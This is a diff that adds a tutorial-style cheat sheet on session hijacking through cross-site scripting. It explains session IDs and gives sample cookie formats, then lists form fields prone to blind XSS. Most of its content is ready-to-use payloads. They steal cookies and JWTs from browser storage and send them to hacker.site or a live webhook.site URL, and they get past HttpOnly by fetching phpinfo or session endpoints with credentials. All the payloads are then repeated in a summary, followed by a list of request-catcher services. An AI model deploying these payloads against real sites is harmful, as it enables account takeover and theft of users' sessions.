@@ -1,5 +1,137 @@
 
+--- Session Hijacking Attack ---
+
+• What is a Session ID?
+• Types of Session IDs
+• Application Areas Prone to Blind XSS Attacks
+• XSS Vulnerability Leading to Session Hijacking
+
+
 Session hijacking refers to gaining access to a user's account in an application without knowing the username and password. When a user logs into an application, they are authenticated for a certain period without the need to continuously provide their credentials. This is possible because the server maintains an active session for the user.
+
+
+-- What is a Session ID? --
+
+To start this session, the server typically provides the user with a unique ID in the form of a session cookie or bearer token. This ID is stored in the browser and is included in all requests sent to the server, allowing the server to recognize and authenticate the active session for the user. This ID is of significant security importance because it authenticates the user and grants access to the application's functions without requiring the user's credentials.
+
+
+-- Types of Session IDs --
+
+These values are generally randomly generated unique identifiers used to securely manage user sessions. Session IDs can be stored in the web browser’s cookies and sent to the server with every request, allowing the server to recognize the user and provide personalized information.
+These values can be accessed within the browser's developer tools (F12) under the Application > Cookies or Storage > Cookies sections.
+
+PHP Session Variable: 
+Name: PHPSESSID, Value: e3r4p17o32f4qe7s5toc2fc677
+
+ASP.NET Session Variable: 
+Name: ASP.NET_SessionId, Value: tgx4p455zv0d0a55p4n3v055
+
+Java Servlet Session Variable: 
+Name: JSESSIONID, Value: abcde12345ABCDE12345ABCDE1234567
+
+Ruby on Rails Session Variable: 
+Name: _rails_session, Value: B3D9D1A37E3569012D9115F53A8B428C
+
+Express.js (Node.js) Session Variable: 
+Name: connect.sid, Value: s%3A37RQhDE4f501Px2-OpCRGKJjv8CLN8Ss.%2B5PV%2B2C1
+
+JWT (JSON Web Token): 
+Name: Authorization, Value: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+
+-- Application Areas Prone to Blind XSS Attacks --
+
+• Contact Forms: Information entered by users into contact form fields, usually reviewed by support teams.
+• Comment Sections: Comments on blogs, news sites, or product pages, visible to other visitors or site administrators.
+• User Profile Fields: Sections where users introduce themselves, like biography or "about me" areas, generally visible to other users.
+• Order Forms: Details entered by users such as name, address, etc., reviewed during order processing and by customer service.
+• Support Ticket Systems: Information entered into support or issue reporting forms, reviewed by the technical support team.
+• Product Reviews: Reviews on e-commerce sites, typically visible to other customers and site administrators.
+• Forum Posts: Discussion forums where user messages are read by other members.
+• Surveys and Feedback Forms: User feedback or survey responses, analyzed and reported on later.
+
+
+-- XSS Vulnerability Leading to Session Hijacking --
+
+➜ Stealing Cookies
+
+<script>fetch("https://hacker.site?data=" + document.cookie);</script>
+
+➜ Stealing JWT Tokens
+
+<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
+<script>fetch("https://hacker.site?data=" + sessionStorage.getItem('JWT'));</script>
+
+<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
+
+https://example.com/home?search=<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
+
+➜ HTTPOnly Flag and Bypass Methods
+
+The HttpOnly cookie flag is a crucial security mechanism used in web applications. This flag ensures that a cookie can only be accessed via HTTP and prevents JavaScript from reading these cookies. 
+
+<script>
+  fetch("http://example.com/phpinfo.php", {credentials: "include"})
+  .then(response => response.text())
+  .then(data => {
+    const base64Data = btoa(data);
+    return fetch("http://hacker.site/?data=" + base64Data);
+  })
+</script>
+
+<script>
+  fetch("http://example.com/api/session", {credentials: "include"})
+  .then(response => response.json())
+  .then(data => {
+    return fetch("http://hacker.site/?data=" + data.sessionId);
+  })
+</script>
+
+<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
+<script>fetch("https://hacker.site?data=" + sessionStorage.getItem('JWT'));</script>
+
+
+-- Payload Summarization --
+
+<script>fetch("https://hacker.site?data=" + document.cookie);</script>
+
+<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
+<script>fetch("https://hacker.site?data=" + sessionStorage.getItem('JWT'));</script>
+<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
+
+https://example.com/home?search=<script>fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);</script>
+
+
+<script>
+  fetch("http://example.com/phpinfo.php", {credentials: "include"})
+  .then(response => response.text())
+  .then(data => {
+    const base64Data = btoa(data);
+    return fetch("http://hacker.site/?data=" + base64Data);
+  })
+</script>
+
+<script>
+  fetch("http://example.com/api/session", {credentials: "include"})
+  .then(response => response.json())
+  .then(data => {
+    return fetch("http://hacker.site/?data=" + data.sessionId);
+  })
+</script>
+
+<script>fetch("https://hacker.site?data=" + localStorage.getItem('JWT'));</script>
+<script>fetch("https://hacker.site?data=" + sessionStorage.getItem('JWT'));</script>
+
+
+
+-- Links --
+
+webhook.site
+pipedream.com
+requestbin.myworkato.com
+
+
+*
 
 
 
